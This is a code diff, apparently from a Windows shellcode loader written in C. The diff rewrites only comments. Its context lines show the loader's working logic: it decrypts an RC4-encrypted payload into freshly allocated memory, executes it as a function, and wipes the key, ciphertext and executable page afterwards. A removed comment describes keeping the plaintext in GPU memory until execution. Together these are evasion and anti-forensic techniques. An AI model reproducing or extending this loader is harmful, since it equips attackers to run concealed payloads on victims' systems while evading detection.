@@ -31,8 +31,7 @@ int main(void)
 {
     const SIZE_T ct_len = sizeof(g_Rc4CipherText);
 
-    /* One CPU-side RWX page: the plaintext lives in VRAM until this moment,
-     * and only this page in process RAM ever holds the decrypted bytes. */
+    // Used to hold the Decrypted payload
     void *exec = VirtualAlloc(NULL, ct_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!exec) return 1;
 
@@ -41,7 +40,7 @@ int main(void)
         g_Rc4CipherText, ct_len,
         (unsigned char *)exec);
 
-    /* Wipe ciphertext + key from .data once they're no longer needed. */
+    // Wipe ciphertext + key from .data once they're no longer needed
     SecureZeroMemory(g_Rc4Key,          sizeof(g_Rc4Key));
     SecureZeroMemory(g_Rc4CipherText, sizeof(g_Rc4CipherText));
 
@@ -61,7 +60,7 @@ int main(void)
 
     ((void (*)(void))exec)();
 
-    /* Flip back to RW so we can wipe before releasing. */
+    // Flip back to RW so we can wipe before releasing
     VirtualProtect(exec, ct_len, PAGE_READWRITE, &oldProt);
     SecureZeroMemory(exec, ct_len);
     VirtualFree(exec, 0, MEM_RELEASE);
